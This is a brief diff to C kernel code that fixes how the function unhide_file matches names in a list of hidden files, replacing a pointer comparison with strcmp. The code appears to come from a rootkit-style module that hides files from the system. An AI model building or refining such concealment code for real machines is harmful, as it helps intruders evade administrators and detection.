@@ -411,7 +411,7 @@ void unhide_file ( char *name )
 
     list_for_each_entry ( hf, &hidden_files, list )
     {
-        if ( name == hf->name )
+        if ( ! strcmp(name, hf->name) )
         {
             list_del(&hf->list);
             kfree(hf->name);
